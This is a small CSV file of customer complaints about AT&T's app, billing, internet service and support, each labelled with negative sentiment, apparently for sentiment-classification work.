Body,Sentiment
AT&T is terrible!! Everything about AT&T I hate!!,negative
full of logging-in bugs,negative
I have been trying View my data use for 30 minutes with no success.,negative
"I cancelled a line over a month ago, yet I’m still being billed for it. I tried the online chat option which got me nowhere, and I’m having trouble reaching a customer service representative on the phone. I knew I should have just taken my business elsewhere!",negative
"My internet goes in and out ALL the time!!  When I call support, I am told the problems are on my end so I schedule an appointment, they sell me yet another promise and it continues to happen??????????. Don’t use AT&T in zip 74434 unless you want constant disappointment and frustration!",negative
"Have lost all contact with your company? 2 months behind on my bill, because I can’t sign in? No text saying you forgot it happens pay now?",negative
It keeps resting my password,negative
"I have been at odds with your company since April over what I was told my discounts were and what you keep billing me. Your cal centers oversees are full of rude, unorganized employees. I will never recommend directv to anyone.",negative
Why do you charge me so much money???????,negative
When I travel is when I most want to use this app to manage my data usage. The problem is I cannot access this account while overseas. Therefore it is useless to me.,negative
